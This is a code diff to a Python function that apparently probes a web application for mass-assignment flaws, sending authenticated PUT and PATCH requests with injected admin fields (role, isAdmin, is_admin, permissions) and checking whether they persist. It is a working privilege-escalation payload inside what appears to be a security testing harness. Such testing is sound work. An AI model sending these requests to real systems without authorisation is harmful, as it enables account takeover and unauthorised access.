@@ -17836,9 +17836,11 @@ def evaluate_sast07_mass_assignment_probe(
             except Exception:
                 continue
 
-    # Send authenticated update requests carrying injected privileged fields (role/isAdmin) and read back
+    # Send authenticated update requests carrying injected privileged fields (role/isAdmin/is_admin/admin/permissions) and read back
     update_targets = ([f"/api/Users/{uid}", f"/api/users/{uid}"] if uid is not None else []) + ["/api/profile"]
-    upd_payload = json.dumps({"role": "admin", "isAdmin": True}).encode("utf-8")
+    upd_payload = json.dumps(
+        {"role": "admin", "isAdmin": True, "is_admin": True, "admin": True, "permissions": ["admin"]}
+    ).encode("utf-8")
     for upath in update_targets:
         updated_ok = False
         for meth in ("PUT", "PATCH"):
@@ -17855,9 +17857,16 @@ def evaluate_sast07_mass_assignment_probe(
                 with urllib.request.urlopen(urllib.request.Request(f"{base}{upath}", headers=auth_hdrs), timeout=4) as r2:
                     r2_json = json.loads(r2.read().decode("utf-8"))
                     u2 = r2_json.get("data") or r2_json.get("user") or r2_json
-                    if isinstance(u2, dict) and (u2.get("role") == "admin" or u2.get("isAdmin") is True):
+                    if isinstance(u2, dict) and (
+                        u2.get("role") == "admin"
+                        or u2.get("isAdmin") is True
+                        or u2.get("is_admin") is True
+                        or u2.get("admin") is True
+                        or (isinstance(u2.get("permissions"), list) and "admin" in u2.get("permissions"))
+                    ):
                         confirmed.append(
-                            f"Update+ReadBack {base}{upath} persisted injected privileged field (role={u2.get('role')!r}, isAdmin={u2.get('isAdmin')!r})"
+                            f"Update+ReadBack {base}{upath} persisted injected privileged field "
+                            f"(role={u2.get('role')!r}, isAdmin={u2.get('isAdmin')!r}, is_admin={u2.get('is_admin')!r}, admin={u2.get('admin')!r})"
                         )
                         break
             except Exception:
